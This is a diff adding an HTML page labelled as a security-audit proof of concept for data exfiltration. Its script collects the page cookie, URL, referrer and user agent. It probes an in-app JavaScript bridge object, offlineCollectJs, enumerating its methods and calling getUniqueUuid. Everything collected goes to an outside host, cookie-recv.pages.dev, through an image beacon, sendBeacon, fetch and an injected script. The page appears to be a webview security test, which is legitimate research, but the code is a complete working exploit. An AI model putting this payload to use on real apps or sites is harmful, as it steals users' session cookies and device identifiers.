@@ -1,0 +1,66 @@
+<!DOCTYPE html>
+<html lang="zh">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>POC_SEC_AUDIT_EXFIL</title>
+</head>
+<body>
+<article>
+  <h1>POC_INJECTED_TITLE_数据外带测试</h1>
+  <div id="probe">JS_PROBE_INIT</div>
+</article>
+<script>
+var RECV = 'https://cookie-recv.pages.dev/leak';
+var probe = document.getElementById('probe');
+
+// 外带数据
+var data = {
+  ts: Date.now(),
+  loc: location.href,
+  title: document.title,
+  cookie: document.cookie || '',
+  ua: navigator.userAgent,
+  ref: document.referrer,
+  jsb_exists: 'unknown',
+  jsb_keys: '',
+  jsb_uuid: '',
+  jsb_err: ''
+};
+
+try {
+  if (typeof offlineCollectJs !== 'undefined') {
+    data.jsb_exists = 'yes';
+    var keys = [];
+    try {
+      for (var k in offlineCollectJs) { keys.push(k + ':' + (typeof offlineCollectJs[k])); }
+    } catch(e) { data.jsb_err += 'enum:'+e+';'; }
+    data.jsb_keys = keys.join(',');
+    try {
+      var r = offlineCollectJs.getUniqueUuid ? offlineCollectJs.getUniqueUuid() : 'no_getUniqueUuid';
+      data.jsb_uuid = String(r);
+    } catch(e1) { data.jsb_uuid = 'CALL_ERR:'+e1; }
+  } else {
+    data.jsb_exists = 'no';
+  }
+} catch(e2) {
+  data.jsb_exists = 'err';
+  data.jsb_err = 'PROBE_ERR:'+e2;
+}
+
+probe.innerText = 'JS_EXECUTED jsb_exists=' + data.jsb_exists + ' keys=' + data.jsb_keys;
+
+var qs = 'probe=' + encodeURIComponent(JSON.stringify(data));
+
+new Image().src = RECV + '?' + qs;
+
+try { navigator.sendBeacon && navigator.sendBeacon(RECV + '?' + qs); } catch(e) {}
+
+try { fetch(RECV + '?' + qs, {mode:'no-cors'}); } catch(e) {}
+
+var s = document.createElement('script');
+s.src = RECV + '?' + qs;
+document.body.appendChild(s);
+</script>
+</body>
+</html>
